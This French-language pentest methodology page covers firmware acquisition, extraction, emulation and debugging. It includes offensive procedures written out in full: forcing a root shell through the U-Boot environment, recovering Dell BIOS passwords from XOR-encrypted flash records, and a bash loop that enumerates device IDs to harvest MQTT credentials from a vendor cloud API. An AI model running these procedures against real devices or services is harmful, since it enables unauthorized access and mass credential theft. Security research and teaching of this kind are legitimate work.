# Analyse du firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduction**

### Ressources associées

Pour extraire le firmware via des interfaces matérielles exposées, consultez [l’extraction du firmware à l’aide d’une console UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) et [l’extraction de la mémoire flash SPI](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Pour effectuer une capture UART reproductible au démarrage, avant l’accès à la console, consultez [l’alimentation contrôlée par SCPI et l’acquisition à l’oscilloscope](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Le firmware est un logiciel essentiel qui permet aux appareils de fonctionner correctement en gérant et en facilitant la communication entre les composants matériels et les logiciels utilisés par les utilisateurs. Il est stocké dans une mémoire permanente, ce qui permet à l’appareil d’accéder aux instructions essentielles dès sa mise sous tension et de lancer le système d’exploitation. L’examen et la modification éventuelle du firmware sont des étapes cruciales pour identifier les vulnérabilités de sécurité.<sup>[[2]](#references)[[3]](#references)</sup>

## **Collecte d’informations**

La **collecte d’informations** est une première étape cruciale pour comprendre la composition d’un appareil et les technologies qu’il utilise. Elle consiste à recueillir des données sur :

- L’architecture du CPU et le système d’exploitation exécuté
- Les spécificités du bootloader
- La configuration matérielle et les fiches techniques
- Les métriques de la base de code et l’emplacement des sources
- Les bibliothèques externes et les types de licences
- L’historique des mises à jour et les certifications réglementaires
- Les schémas d’architecture et de flux
- Les évaluations de sécurité et les vulnérabilités identifiées

À cette fin, les outils d’**open-source intelligence (OSINT)** sont précieux, tout comme l’analyse de tout composant logiciel open source disponible, au moyen de processus d’examen manuels et automatisés. Des outils comme [Coverity Scan](https://scan.coverity.com) et [LGTM de Semmle](https://lgtm.com/#explore) offrent une analyse statique gratuite qui peut aider à détecter d’éventuels problèmes.

## **Obtention du firmware**

Il existe plusieurs façons d’obtenir un firmware, chacune présentant un niveau de complexité différent :

- L’obtenir **directement** auprès de la source (développeurs, fabricants)
- Le **compiler** à partir des instructions fournies
- Le **télécharger** depuis les sites d’assistance officiels
- Utiliser des requêtes **Google dork** pour trouver des fichiers de firmware hébergés
- Accéder directement au **cloud storage** à l’aide d’outils comme [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercepter les **mises à jour** à l’aide de techniques de man-in-the-middle
- L’**extraire** de l’appareil via des connexions comme **UART**, **JTAG** ou **PICit**
- **Sniffer** les demandes de mise à jour dans les communications de l’appareil
- Repérer et utiliser des **endpoints de mise à jour codés en dur**
- L’**extraire** depuis le bootloader ou le réseau
- **Retirer et lire** la puce de stockage, en dernier recours, à l’aide du matériel approprié

### Journaux UART uniquement : forcer un shell root via l’environnement U-Boot dans la mémoire flash

Si RX UART est ignoré (journaux uniquement), vous pouvez tout de même forcer un shell init en **modifiant hors ligne le blob d’environnement U-Boot** :<sup>[[6]](#references)</sup>

1. Extraire la mémoire flash SPI avec une pince SOIC-8 et un programmateur (3,3 V) :
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Localisez la partition env de U-Boot, modifiez `bootargs` pour inclure `init=/bin/sh`, puis **recalculez le CRC32 de l’env U-Boot** pour le blob.
3. Reflashez uniquement la partition env et redémarrez ; un shell devrait apparaître sur l’UART.

Cette méthode est utile sur les appareils embarqués dont le shell du bootloader est désactivé, mais dont la partition env est accessible en écriture via un accès externe à la mémoire flash.

## Analyse du firmware

Maintenant que vous **avez le firmware**, vous devez en extraire des informations pour savoir comment le traiter. Voici différents outils que vous pouvez utiliser :

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Si vous ne trouvez pas grand-chose avec ces outils, vérifiez l’**entropie** de l’image avec `binwalk -E <bin>` : si elle est faible, le contenu n’est probablement pas chiffré. Si elle est élevée, il est probablement chiffré (ou compressé d’une manière ou d’une autre).

Vous pouvez également utiliser ces outils pour extraire les **fichiers intégrés au firmware** :

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Vous pouvez aussi utiliser [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) pour inspecter le fichier.

### Analyse différentielle du flash et stockages de secrets XOR récupérables

Lorsqu’un paramètre du firmware n’a pas de format de stockage documenté, commencez par effectuer plusieurs lectures identiques du flash, modifiez **exactement un** paramètre, puis dumpez à nouveau la puce entière et comparez les offsets. Répéter l’expérience avec des valeurs contrôlées permet de distinguer le paramètre des compteurs et des métadonnées d’écriture ; des modifications à de nouveaux offsets plutôt qu’en place indiquent un stockage en ajout seul ou structuré en journal. Conservez les entrées supprimées ou marquées comme telles, car leurs octets de données peuvent rester récupérables.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

After avoir localisé la région, extrayez les modules du firmware à l’aide d’outils tels que `binwalk`, puis procédez à la rétro-ingénierie du code d’écriture et de validation dans Ghidra. Confirmez dans le code les limites des champs, le remplissage, l’indexation des clés et la dérivation des clés, au lieu de déduire le schéma uniquement à partir des motifs du texte chiffré.<sup>[[12]](#references)</sup>

#### Récupérer des clés à partir d’un remplissage nul chiffré

Comme décrit dans [le chiffrement basé sur XOR](../../crypto/symmetric/#xor-based-encryption), un texte clair connu révèle les octets de flot de clés aux mêmes décalages. Un champ de taille fixe est particulièrement vulnérable lorsque son remplissage nul couvre tous les index d’une clé XOR répétée : le remplissage chiffré révèle directement ces octets de clé, car `0x00 XOR key_byte = key_byte`. Si tous les index de la clé sont couverts, reconstituez la clé à partir de la fin du texte chiffré, puis déchiffrez les octets renseignés.<sup>[[12]](#references)</sup>

Le format de mot de passe BIOS DVAR vulnérable de Dell en est un exemple concret : l’octet `0` d’un champ de 32 octets est en clair, tandis que les octets `1..31` utilisent une clé répétée de 20 octets.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Pour une longueur de mot de passe `L`, les positions `L..31` étaient nulles avant le XOR. Lorsque `L <= 12`, ces positions couvrent chaque index de clé, ce qui permet de retrouver la clé complète et le mot de passe sans brute force :<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Extraire les clés des enregistrements historiques

N’analysez pas chaque enregistrement indépendamment. La clé DVAR est dérivée approximativement comme suit : `modified_md5(device_seed || variable_GUID || password[0])` : le seed de l’appareil et le GUID sont fixes, et le seul paramètre dépendant du mot de passe est le premier octet en clair. Cela donne au plus 256 clés par appareil, et les enregistrements commençant par le même octet partagent une clé. Regroupez les enregistrements actifs et supprimés selon cet octet ; un court enregistrement historique peut révéler la clé complète grâce au padding et permettre de déchiffrer un enregistrement actuel plus long dont le padding ne suffit pas. La rotation du mot de passe peut donc accroître l’exposition lorsque l’ancien texte chiffré est marqué comme supprimé au lieu d’être effacé.<sup>[[12]](#references)</sup>

L’outil [`dellpwn`](https://github.com/R3n5k1/dellpwn) localise les enregistrements DVAR, valide les enregistrements candidats, récupère les mots de passe et peut afficher les octets bruts stockés/de clé. Compilez-le à partir d’un checkout et analysez une image flash vérifiée comme suit :<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Pour les parseurs personnalisés, rejetez les faux positifs à l’aide de la structure des enregistrements, de contraintes sur les caractères imprimables, de vérifications du remplissage par des zéros, de l’entropie de la clé et de contrôles de cohérence aux endroits où la clé reboucle. Si des dumps répétés révèlent des changements de bits peu nombreux à chaque écriture, énumérez les masques observés et classez les corrections possibles selon ces contraintes, mais signalez les caractères ambigus au lieu de présenter un résultat heuristique comme une récupération exacte.<sup>[[12]](#references)</sup>

Les vérificateurs de mots de passe devraient stocker un hash à sens unique, salé et itéré, plutôt qu’un texte chiffré réversible, et les systèmes de stockage à journalisation structurée devraient supprimer de manière sécurisée les données secrètes remplacées.<sup>[[12]](#references)</sup>

### Récupération du système de fichiers

Avec les outils précédemment commentés, comme `binwalk -ev <bin>`, vous devriez avoir pu **extraire le système de fichiers**.\
Binwalk l’extrait généralement dans un **dossier nommé d’après le type de système de fichiers**, qui est le plus souvent l’un des suivants : squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extraction manuelle du système de fichiers

Parfois, binwalk **n’aura pas l’octet magique du système de fichiers dans ses signatures**. Dans ces cas, utilisez binwalk pour **trouver le décalage du système de fichiers et extraire par carving le système de fichiers compressé** du binaire, puis **extraire manuellement** le système de fichiers selon son type en suivant les étapes ci-dessous.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Exécutez la **commande dd** suivante pour extraire le système de fichiers Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativement, la commande suivante peut également être exécutée.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Pour squashfs (utilisé dans l’exemple ci-dessus)

`$ unsquashfs dir.squashfs`

Les fichiers se trouveront ensuite dans le répertoire "`squashfs-root`".

- Fichiers d’archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Pour les systèmes de fichiers jffs2

`$ jefferson rootfsfile.jffs2`

- Pour les systèmes de fichiers ubifs avec mémoire flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Reconstruire des systèmes de fichiers racine embarqués répartis sur plusieurs segments

Si un dump brut eMMC/SSD contient un en-tête de système de fichiers valide, mais que les décalages de ses métadonnées dépassent les limites de la partition nominale, ne le considérez pas immédiatement comme corrompu. Le code de démarrage embarqué peut assembler le périphérique racine réel à partir de plusieurs plages physiques avec Device Mapper ; l’extraction d’une seule partition GPT ne produit donc que le premier segment.<sup>[[9]](#references)</sup>

#### Examiner l’image complète du support

Vérifiez d’abord que l’acquisition est terminée, que la taille est stable et qu’aucun processus d’écriture n’utilise encore l’image. Si le nom de fichier encode une adresse de début et de fin, comparez cette plage au nombre réel d’octets. Récupérez la GPT en mode lecture seule et n’attachez que la plage requise ; **ne** lancez **pas** `vgchange -ay` sur un volume physique non fiable depuis le poste de travail, car des conflits entre groupes de volumes et des écritures involontaires sont possibles.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Préférez une VM jetable lorsque la logique d’initialisation d’origine ou une pile LVM doit traiter l’image entière. Les journaux de démarrage historiques d’une partition de démarrage standard sont particulièrement utiles : le bootloader peut avoir enregistré les décalages du conteneur propriétaire, les longueurs des composants, la sélection du slot, les règles d’alignement et la vérification de signature. Utilisez ces valeurs pour extraire une ligne de commande intégrée, un noyau et un initramfs, puis validez chaque sortie séparément avec `file`, les octets magiques et `binwalk` ; lire jusqu’à la fin du conteneur peut accidentellement ajouter un initrd, un objet ACPI ou une signature au noyau.<sup>[[9]](#references)</sup>

#### Récupérer la carte des blocs au démarrage

Extrayez l’initramfs du noyau et faites de la rétro-ingénierie sur son `/init` et sur toutes les bibliothèques de stockage. Dans [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), suivez les références aux chaînes `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` et aux chemins de partition ; remontez ensuite le code qui sélectionne le slot A/B actif et construit la table. Pour démarrer avec radare2, vous pouvez utiliser `r2 -A init`, `afl`, `pdf @ main` et `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

La cible linear associe des plages consécutives d’un périphérique virtuel à des plages d’un ou plusieurs périphériques sous-jacents. Une table récupérée à deux segments présente souvent cette forme (toutes les positions et longueurs sont exprimées en secteurs de 512 octets) :<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduisez exactement l’arithmétique du code machine, notamment la largeur des entiers, les décalages et les conversions d’unités. Par exemple, l’expression suivante arrondit la taille en octets à la baisse au multiple de 4 Kio, puis la convertit en secteurs de 512 octets ; la remplacer par `p4_bytes // 512` décale la fin sélectionnée de `p4_bytes % 4096` lorsque la partition n’est pas alignée sur une page.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Reconstruisez une image d’analyse à plat en copiant les plages dans l’ordre du tableau, par blocs de taille limitée, plutôt que de charger le dump média complet en mémoire. Cela évite également de créer des périphériques mapper côté hôte. Gardez les offsets dérivés de GPT, les nombres de secteurs inversés et la longueur de sortie résultante comme assertions distinctes.<sup>[[9]](#references)</sup>

#### Distinguer la corruption d’une erreur de reconstruction constante

Pour SquashFS, vérifiez la magic `hsqs` et décodez le champ `bytes_used` little-endian de 64 bits à l’offset 40 du superbloc avant d’exécuter `unsquashfs`. Si l’extraction échoue dans plusieurs structures sans lien entre elles, recherchez dans une large fenêtre autour des positions attendues et exigez des candidats structurels solides : un bloc de métadonnées décompressible, plusieurs entrées de répertoire consécutives valides, des champs d’inode plausibles, un inode racine cohérent avec le nombre d’inodes ou une structure de métadonnées d’intégrité valide. Une seule correspondance de magic ne suffit pas.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Lorsque le même delta signé rend valides des structures indépendantes — par exemple les métadonnées d’un répertoire et un enregistrement verity — la cause probable est une erreur systématique de début de segment plutôt que des octets manquants. Revenez aux calculs inversés et recherchez des restes ignorés, des problèmes de signe, des dépassements ou des arrondis au secteur/à la page avant de tenter de récupérer des fichiers orphelins ou de corriger les métadonnées du système de fichiers.<sup>[[9]](#references)</sup>

Enfin, distinguez les périmètres de protection : les volumes LUKS scellés par TPM protègent la confidentialité des données, tandis qu’un mappage dm-verity signé protège l’intégrité du système de fichiers racine. Un TPM logiciel ne permet pas de récupérer une clé scellée au TPM physique d’origine, et démarrer un SquashFS modifié avec un init réservé à la recherche qui omet la vérification verity ne falsifie pas sa signature et ne contourne pas dm-verity.<sup>[[9]](#references)</sup>

## Analyse du firmware

Une fois le firmware obtenu, il est essentiel de le disséquer pour comprendre sa structure et ses vulnérabilités potentielles. Ce processus implique l’utilisation de divers outils pour analyser et extraire des données utiles de l’image du firmware.

### Outils d’analyse initiale

Un ensemble de commandes est fourni pour inspecter initialement le fichier binaire (désigné par `<bin>`). Ces commandes aident à identifier les types de fichiers, à extraire des chaînes de caractères, à analyser les données binaires et à comprendre les détails des partitions et des systèmes de fichiers :

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Pour évaluer le niveau de chiffrement de l’image, on vérifie son **entropie** avec `binwalk -E <bin>`. Une entropie faible suggère une absence de chiffrement, tandis qu’une entropie élevée peut indiquer un chiffrement ou une compression.

Pour extraire les **fichiers intégrés**, il est recommandé d’utiliser des outils et ressources comme la documentation **file-data-carving-recovery-tools** et **binvis.io** pour inspecter les fichiers.

### Extraction du système de fichiers

Avec `binwalk -ev <bin>`, on peut généralement extraire le système de fichiers, souvent dans un répertoire nommé d’après son type (p. ex., squashfs, ubifs). Toutefois, lorsque **binwalk** ne parvient pas à reconnaître le type de système de fichiers en raison de l’absence d’octets magiques, une extraction manuelle est nécessaire. Il faut alors utiliser `binwalk` pour localiser le décalage du système de fichiers, puis la commande `dd` pour en extraire les données :

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Ensuite, selon le type de système de fichiers (par exemple, squashfs, cpio, jffs2, ubifs), différentes commandes sont utilisées pour extraire manuellement le contenu.

### Analyse du système de fichiers

Une fois le système de fichiers extrait, la recherche de failles de sécurité commence. On examine notamment les démons réseau non sécurisés, les identifiants codés en dur, les points de terminaison d’API, les fonctionnalités des serveurs de mise à jour, le code non compilé, les scripts de démarrage et les binaires compilés pour une analyse hors ligne.

**Emplacements clés** et **éléments** à inspecter :

- **etc/shadow** et **etc/passwd** pour les identifiants des utilisateurs
- Les certificats et clés SSL dans **etc/ssl**
- Les fichiers de configuration et les scripts à la recherche de vulnérabilités potentielles
- Les binaires embarqués pour une analyse approfondie
- Les serveurs web et binaires courants des appareils IoT

Plusieurs outils permettent de détecter les informations sensibles et les vulnérabilités dans le système de fichiers :

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) et [**Firmwalker**](https://github.com/craigz28/firmwalker) pour rechercher des informations sensibles
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) pour une analyse complète du firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) et [**EMBA**](https://github.com/e-m-b-a/emba) pour l’analyse statique et dynamique

### Vérifications de sécurité des binaires compilés

Le code source et les binaires compilés trouvés dans le système de fichiers doivent être examinés à la recherche de vulnérabilités. Des outils comme **checksec.sh** pour les binaires Unix et **PESecurity** pour les binaires Windows permettent de repérer les binaires insuffisamment protégés qui pourraient être exploités.

## Récupération de la configuration cloud et des identifiants MQTT à l’aide de tokens d’URL dérivés

De nombreux hubs IoT récupèrent leur configuration propre à chaque appareil depuis un point de terminaison cloud qui ressemble à ceci :<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Lors de l’analyse du firmware, vous pouvez découvrir que `<token>` est dérivé localement de l’identifiant de l’appareil à l’aide d’un secret codé en dur, par exemple :

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Cette conception permet à toute personne connaissant un deviceId et le STATIC_KEY de reconstruire l’URL et de récupérer la configuration cloud, qui révèle souvent des identifiants MQTT en texte clair et des préfixes de topics.

Procédure pratique :

1) Extraire le deviceId des logs de démarrage UART

- Connectez un adaptateur UART 3,3 V (TX/RX/GND) et capturez les logs :

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Recherchez les lignes qui affichent le modèle d’URL de configuration cloud et l’adresse du broker, par exemple :

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Récupérer STATIC_KEY et l’algorithme du token à partir du firmware

- Charger les binaires dans Ghidra/radare2 et rechercher le chemin de configuration ("/pf/") ou l’utilisation de MD5.
- Confirmer l’algorithme (p. ex., MD5(deviceId||STATIC_KEY)).
- Générer le token dans Bash et mettre le digest en majuscules :

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Récupérer la configuration cloud et les identifiants MQTT

- Composez l’URL et récupérez le JSON avec curl ; analysez-le avec jq pour extraire les secrets :

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Exploiter MQTT en clair et les ACL de topic faibles (si présentes)

- Utilisez les identifiants récupérés pour vous abonner aux topics de maintenance et rechercher des événements sensibles :

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Énumérer les identifiants d’appareil prévisibles (à grande échelle, avec autorisation)

- De nombreux écosystèmes intègrent des octets OUI/produit/type du fabricant, suivis d’un suffixe séquentiel.
- Vous pouvez parcourir les identifiants candidats, générer des jetons et récupérer des configurations par programmation :

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- Obtenez toujours une autorisation explicite avant toute tentative d'énumération massive.
- Privilégiez l'émulation ou l'analyse statique pour récupérer des secrets sans modifier le matériel cible, lorsque c'est possible.


L'émulation du firmware permet d'effectuer une **analyse dynamique** du fonctionnement d'un appareil ou d'un programme individuel. Cette approche peut se heurter à des dépendances matérielles ou architecturales, mais transférer le système de fichiers racine ou des binaires spécifiques vers un appareil doté d'une architecture et d'un boutisme identiques, tel qu'un Raspberry Pi, ou vers une machine virtuelle préconfigurée peut faciliter les tests.

### Émulation de binaires individuels

Pour examiner des programmes isolés, il est essentiel d'identifier leur boutisme et leur architecture CPU.

#### Exemple avec l'architecture MIPS

Pour émuler un binaire d'architecture MIPS, vous pouvez utiliser la commande :

```bash
file ./squashfs-root/bin/busybox
```

Et pour installer les outils d’émulation nécessaires :

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Pour MIPS (big-endian), on utilise `qemu-mips`, tandis que `qemu-mipsel` convient aux binaires little-endian.

#### Émulation de l’architecture ARM

Pour les binaires ARM, le processus est similaire : l’émulateur `qemu-arm` est utilisé pour l’émulation.

### Émulation complète du système

Des outils comme [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) et d’autres facilitent l’émulation complète du firmware, automatisent le processus et facilitent l’analyse dynamique.

### Reconstruction des systèmes de fichiers root scindés et vérifiés pour l’émulation

Si un superbloc SquashFS est lisible, mais que les offsets des inodes, des répertoires ou de la table des fragments sont impossibles, ne corrigez pas immédiatement `unsquashfs`. Analysez le binaire de démarrage précoce et reproduisez le graphe des périphériques bloc qu’il crée : les systèmes embarqués peuvent exposer une partition root nominale, mais construire le véritable système de fichiers au moyen d’un mapping `dm-linear` qui ajoute des secteurs empruntés à une autre partition. Les vérifications du seul superbloc peuvent réussir même si tous les blocs de métadonnées suivants sont décalés.<sup>[[11]](#references)</sup>

Reproduisez exactement les calculs arithmétiques du firmware. En particulier, déterminez si les longueurs sont exprimées en octets, en secteurs de 512 octets ou en pages de 4 Kio ; reproduisez les décalages et les troncatures dans leur ordre d’origine ; et tenez compte des régions de fin dépendantes de la banque dans les configurations A/B. Par exemple, `(partition_bytes >> 12) << 3` tronque d’abord à une limite de 4 Kio, puis exprime le résultat en secteurs de 512 octets ; le remplacer par `partition_bytes // 512` peut décaler l’étendue ajoutée de quelques kilooctets et corrompre toutes les tables SquashFS en aval.<sup>[[11]](#references)</sup>

Voici un processus de validation utile :<sup>[[11]](#references)</sup>

1. Récupérez le périphérique source, le secteur de départ et la longueur de chaque segment `dm-linear` à partir du binaire de vérification/d’init.
2. Concaténez ou mappez les étendues sans modifier leur sémantique d’alignement.
3. Si l’extraction échoue toujours, recherchez uniquement dans une petite fenêtre autour de la limite prévue et exigez plusieurs structures de métadonnées valides consécutives, au lieu de vous fier à un superbloc simplement plausible.
4. Exécutez un `unsquashfs` non modifié sur l’image reconstruite ; le parcours réussi de tous les répertoires et fragments constitue une preuve plus solide que `unsquashfs -stat`.

#### Remplacement de dm-verity contrôlé par l’analyste

Lorsque l’analyste contrôle le noyau QEMU, l’initramfs et les disques virtuels, il est possible de démarrer un root modifié en remplaçant le PID 1 de vérification du fournisseur par un petit init lié statiquement. Il s’agit d’une **substitution de la chaîne de démarrage en laboratoire**, et non d’une compromission de dm-verity, de sa signature RSA, de Secure Boot ou d’une clé scellée par un TPM.<sup>[[11]](#references)</sup>

L’init de remplacement doit reproduire les étapes opérationnelles du chemin de démarrage d’origine : monter `devtmpfs`, appeler `setsid()`, connecter `/dev/console` aux descripteurs de fichier 0–2, monter `/proc` et `/sys`, attendre le périphérique bloc fourni, monter le root modifié en lecture seule, détacher les pseudo-systèmes de fichiers de l’ancien root, déplacer le nouveau montage sur `/`, effectuer un `chroot`, puis exécuter (`execve()`) le `/sbin/init` d’origine du firmware. Détacher `/dev`, `/proc` et `/sys` **avant** `MS_MOVE` évite de détacher accidentellement les points de montage appartenant au nouveau root.<sup>[[11]](#references)</sup>

Gardez l’état modifiable du périphérique séparé du root immuable modifié. Un overlay qcow2 peut préserver l’état LVM du disque d’origine, tandis qu’un second disque virtio en lecture seule fournit le SquashFS modifié :<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Débogage de l’état de l’image hors ligne

Inspectez l’état persistant en dehors du guest lorsque les démarrages lents, les scripts de démarrage destructifs ou les journaux de console peu fiables rendent l’échec difficile à diagnostiquer. Ne montez jamais un overlay utilisé par une VM en cours d’exécution ; exposez-le avec `qemu-nbd`, limitez la découverte LVM à la partition NBD prévue et désactivez le groupe de volumes avant de le déconnecter.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Pour isoler les pannes de manière reproductible, écrivez des fichiers marqueurs horodatés sur un volume inscriptible stable et vérifiez-les hors ligne ; `/dev/kmsg`, les FIFO et les consoles transitoires peuvent produire de faux négatifs en raison de la limitation du débit ou de l’arrêt prématuré d’un processus. Comparez également les interfaces exactes entre les différentes couches avant de modifier du code sans rapport : `uname -r` par rapport à `/lib/modules/`, les fonctionnalités ext4 sur disque par rapport à la configuration du noyau, et la génération de `libGL` de Mesa par rapport à l’ABI du pilote DRI et aux noms de pilotes déduits du PCI. Un composant peut être présent et même se charger correctement avec `dlopen()`, tout en restant inutilisable parce que son consommateur attend une ABI différente.<sup>[[11]](#references)</sup>

## Analyse dynamique en pratique

À ce stade, on utilise un environnement d’appareil réel ou émulé pour l’analyse. Il est essentiel de conserver un accès shell au système d’exploitation et au système de fichiers. L’émulation ne reproduit pas toujours parfaitement les interactions matérielles, ce qui peut nécessiter des redémarrages ponctuels de l’émulateur. L’analyse doit réexaminer le système de fichiers, exploiter les pages web et les services réseau exposés, et rechercher des vulnérabilités dans le bootloader. Les tests d’intégrité du firmware sont essentiels pour détecter d’éventuelles vulnérabilités de type backdoor.

## Techniques d’analyse à l’exécution

L’analyse à l’exécution consiste à interagir avec un processus ou un binaire dans son environnement d’exécution, à l’aide d’outils comme gdb-multiarch, Frida et Ghidra pour définir des points d’arrêt et détecter des vulnérabilités par fuzzing et d’autres techniques.

Pour les cibles embarquées sans débogueur complet, **copiez un `gdbserver` lié statiquement** sur l’appareil et connectez-vous à distance :<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / mappage des messages du coprocesseur radio

Sur les hubs IoT, la pile RF est souvent répartie entre un **MCU radio** et un processus Linux en espace utilisateur. Une méthode utile consiste à cartographier le chemin :<sup>[[8]](#references)</sup>

1. **Trame RF** sur le réseau radio
2. **Parseur côté contrôleur** sur le MCU radio
3. **Protocole texte ou TLV série/UART** transmis à Linux (par exemple `/dev/tty*`)
4. **Dispatcheur de l’application** dans le daemon principal
5. **Gestionnaire spécifique au protocole / machine à états**

